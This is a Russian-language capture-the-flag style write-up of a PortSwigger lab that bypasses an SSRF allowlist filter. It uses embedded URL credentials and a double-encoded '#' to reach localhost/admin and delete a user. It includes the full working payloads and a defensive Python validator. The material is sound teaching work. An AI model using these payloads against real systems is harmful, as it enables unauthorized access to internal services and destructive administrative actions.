## Lab: SSRF with whitelist-based input filter


**Платформа:** PortSwigger Web Security Academy  
**Категория:** SSRF  
**Сложность:** Expert  
**Дата:** 2025-07-17  

---

## TL;DR
Whitelist фильтр разрешает только `stock.weliketoshop.net`.
Обойдено через комбинацию встроенных учётных данных в URL
и двойного кодирования символа `#` (`%2523`) — фильтр видит
разрешённый hostname, сервер идёт на `localhost`.
Удалён пользователь `carlos`.


---

## Теория — структура URL и уязвимость парсера

### Полная структура URL

```
http://username:password@hostname:port/path?query#fragment
         ↑         ↑        ↑       ↑    ↑      ↑       ↑
      логин    пароль    хост    порт  путь  запрос  якорь
```

Символ `#` — начало фрагмента. Всё после `#` не отправляется
на сервер — это только для браузера.

### Ключевая проблема — разные парсеры читают URL по-разному

```
URL: http://localhost#@stock.weliketoshop.net/

Парсер фильтра:
→ hostname = stock.weliketoshop.net (видит хост после #@)
→ whitelist совпадает → пропускает

Парсер сервера:
→ hostname = localhost (видит хост до #)
→ fragment = @stock.weliketoshop.net/
→ идёт на localhost!
```

### Двойное кодирование # как %2523

```
#  →  %23    (обычное URL кодирование)
%  →  %25    (кодирование символа %)
Итого: # → %2523 (двойное кодирование)

Фильтр декодирует %25 → %:
%2523 → %23 (не воспринимает как #, не видит фрагмент)
hostname = stock.weliketoshop.net → whitelist ✓

Сервер декодирует оба раза:
%2523 → %23 → #
URL: http://localhost#@stock.weliketoshop.net/
hostname = localhost → идёт на localhost!
```

---
## Разведка

### Шаг 1 — Проверка whitelist фильтра

Перехватила запрос Check stock, отправила в Repeater.
Попробовала стандартный SSRF payload:

```
stockApi=http://127.0.0.1/   →  заблокировано
stockApi=http://localhost/   →  заблокировано
```

Фильтр извлекает hostname и проверяет по whitelist.
Всё что не `stock.weliketoshop.net` — блокируется.

![Прямые запросы заблокированы](./images/07-01-whitelist-block.png)

### Шаг 2 — Проверка встроенных учётных данных

Попробовала вставить разрешённый hostname через `@`:

```
stockApi=http://username@stock.weliketoshop.net/   →  разрешено
```

Фильтр видит hostname `stock.weliketoshop.net` — пропускает.
`username@` воспринимается как учётные данные — не влияет на проверку.

![Встроенные учётные данные проходят фильтр](./images/07-02-credentials-bypass.png)

### Шаг 3 — Проверка символа #

Попробовала вставить `#` чтобы разделить URL:

```
stockApi=http://localhost#@stock.weliketoshop.net/   →  заблокировано
```

Фильтр видит `#` и блокирует. Нужно закодировать.

### Шаг 4 — Двойное кодирование #

Закодировала `#` дважды: `#` → `%23` → `%2523`:

```
stockApi=http://localhost%2523@stock.weliketoshop.net/
```

Получила ответ **500 Internal Server Error** —
сервер попытался подключиться к `localhost` и что-то пошло не так.
Это подтверждает что фильтр обойдён и сервер идёт на `localhost`.

![Двойное кодирование вызвало Internal Server Error](./images/07-03-double-encoding.png)

---

## Эксплуатация

### Шаг 5 — Получение доступа к админ-панели

Добавила путь `/admin` к payload:

```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

Разбор финального payload:
```
http://          ← протокол
localhost:80     ← реальный hostname:port (для сервера после декодирования #)
%2523            ← двойно закодированный #
                 ← фильтр видит %23 (не #) → не разделитель фрагмента
                 ← сервер декодирует в # → разделитель фрагмента
@stock.weliketoshop.net  ← hostname для фильтра (whitelist ✓)
                          ← фрагмент для сервера (игнорируется)
/admin           ← путь к админ-панели
```

В ответе вернулся HTML страницы администратора.

![Доступ к админ-панели через обход whitelist](./images/07-04-admin-access.png)

### Шаг 6 — Удаление пользователя carlos

В HTML нашла ссылку на удаление `carlos`.
Подставила финальный payload:

```
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Пользователь удалён — лаба решена.

![Финальный запрос на удаление](./images/07-05-delete-carlos.png)

---

## Что видит фильтр vs что делает сервер

```
Фильтр проверяет:
http://localhost:80%23@stock.weliketoshop.net/admin/...
hostname = stock.weliketoshop.net  ← whitelist ✓ пропускает

Сервер выполняет (после декодирования):
http://localhost:80#@stock.weliketoshop.net/admin/...
hostname = localhost:80  ← идёт на localhost!
path     = /admin/delete?username=carlos
fragment = @stock.weliketoshop.net/admin/...  ← игнорируется
```

---

## Итог

Whitelist фильтрация надёжнее blacklist — но уязвима когда
фильтр и сервер используют разные парсеры URL. Двойное кодирование
`%2523` создаёт URL который две системы интерпретируют по-разному:
фильтр видит разрешённый hostname, сервер идёт на внутренний адрес.

---

## Защита

```python
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_HOSTS = ['stock.weliketoshop.net']

def is_safe_url(url: str) -> bool:
    # Декодируем URL полностью перед проверкой
    # чтобы фильтр и сервер использовали одинаковое представление
    from urllib.parse import unquote
    url = unquote(unquote(url))  # двойное декодирование

    parsed = urlparse(url)

    # Проверяем что нет фрагмента (#) — он может скрывать реальный hostname
    if parsed.fragment:
        return False

    # Проверяем что нет встроенных учётных данных
    if parsed.username or parsed.password:
        return False

    # Резолвим hostname в IP
    try:
        ip = ipaddress.ip_address(
            socket.gethostbyname(parsed.hostname)
        )
        if ip.is_private or ip.is_loopback:
            return False
    except Exception:
        return False

    # Allowlist проверка
    if parsed.hostname not in ALLOWED_HOSTS:
        return False

    return True

if not is_safe_url(stock_api_url):
    abort(400, "Invalid URL")
```

Дополнительно:
- Декодировать URL **дважды** перед проверкой —
  чтобы исключить двойное кодирование
- Блокировать URL со встроенными учётными данными (`user@host`)
- Блокировать URL с фрагментом (`#`)
- Использовать одну и ту же библиотеку парсинга URL
  везде в приложении — фильтр и сервер должны
  интерпретировать URL одинаково
- Резолвить hostname в IP перед проверкой